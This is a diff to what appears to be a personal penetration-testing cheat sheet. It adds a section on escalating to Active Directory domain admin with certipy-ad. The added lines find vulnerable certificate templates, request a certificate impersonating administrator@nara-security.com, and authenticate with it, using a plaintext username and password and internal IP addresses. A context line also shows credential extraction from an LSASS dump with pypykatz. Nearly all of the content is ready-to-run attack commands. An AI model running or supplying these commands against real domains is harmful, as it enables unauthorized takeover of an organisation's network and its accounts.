@@ -145,3 +145,15 @@
 - forensics dump 
 - https://github.com/skelsec/pypykatz
 - ``` pypykatz lsa mimidump {file} ``` read detail
+
+## Certipy-ad privesc to domain admin
+- try more times on reruning the command if timeed out
+- ``` 
+    certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 192.168.244.30 -bloodhound
+
+
+    [****Try step2 first***** if not working then go step 1 ]
+    certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.244.30 -debug
+
+    certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.244.30
+   ```
